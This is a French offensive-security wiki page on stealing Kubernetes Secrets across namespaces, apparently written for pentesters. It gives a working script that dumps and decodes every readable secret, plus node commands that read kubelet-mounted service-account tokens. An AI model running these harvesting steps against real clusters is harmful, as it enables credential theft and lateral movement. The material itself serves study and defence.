---
title: "Vol de jetons et de secrets : récolter des identifiants à travers les namespaces"
order: 1
description: "Les secrets Kubernetes contiennent des jetons de comptes de service, des identifiants de registre, des clés TLS et des mots de passe applicatifs. Une identité capable de lire les secrets, ou qui les atteint via etcd ou l'accès à un nœud, les récolte à travers les namespaces pour collecter des jetons d'identités plus privilégiées et des identifiants de systèmes backend, alimentant la poursuite du mouvement latéral."
keywords:
  - secret theft
  - service account token
  - cross-namespace
  - credentials
  - lateral movement
---

# Vol de jetons et de secrets

Les secrets sont l'endroit où Kubernetes concentre les identifiants : jetons de comptes de service, identifiants de récupération d'image, clés privées TLS, et tout ce que les applications y stockent, comme des mots de passe de bases de données et de cloud. Les récolter est le carburant du mouvement latéral, car un secret lu dans un namespace contient fréquemment un jeton d'une identité plus privilégiée ou le mot de passe d'un backend qui mène ailleurs. L'accès peut venir de l'API (avec des droits de lecture de secrets), d'etcd, ou d'un nœud.

```bash
# via the API, across every namespace the identity can read
kubectl get secrets -A -o json > secrets.json
python3 - <<'PY'
import json,base64
for s in json.load(open("secrets.json"))["items"]:
    ns=s["metadata"]["namespace"]; nm=s["metadata"]["name"]; t=s.get("type","")
    for k,v in (s.get("data") or {}).items():
        try: val=base64.b64decode(v).decode("utf-8","replace")
        except Exception: continue
        if k=="token" or any(x in k.lower() for x in ("pass","key","secret",".dockerconfigjson")):
            print(ns, nm, t, k, "=", val[:70])
PY
```

## Autres sources des mêmes secrets

```bash
# from a node: every pod's projected token and mounted secrets
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
find /var/lib/kubelet/pods -path '*kubernetes.io~secret*' -type f 2>/dev/null
# from etcd: the raw store, bypassing RBAC entirely (see the etcd page)
```

## Notes d'exploitation

- Priorisez les secrets à clé `token` et de type `kubernetes.io/service-account-token` : chacun est une identité utilisable, et l'un d'eux lié à un rôle admin équivaut à une compromission du cluster ; décodez-le et testez avec `auth can-i --list`.
- Les secrets `.dockerconfigjson` sont des identifiants de registre qui ouvrent la voie vers la chaîne d'approvisionnement des images ; les secrets TLS exposent les clés privées des services du cluster.
- La lecture inter-namespaces est le multiplicateur de force ; un rôle qui autorise `get secrets` à l'échelle du cluster transforme cela en une récolte de toutes les identités d'un coup, voir [Rôles trop permissifs](../rbac-privilege-escalation/over-permissive-roles.md).
- L'accès au nœud et à etcd expose les mêmes secrets sans droits d'API ; voir [Vol d'identifiants kubelet](../pod-escape-to-node/kubelet-credential-theft.md) et [etcd](../exposed-components/etcd.md).

## Références

- [Kubernetes : secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [HackTricks : secrets Kubernetes](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
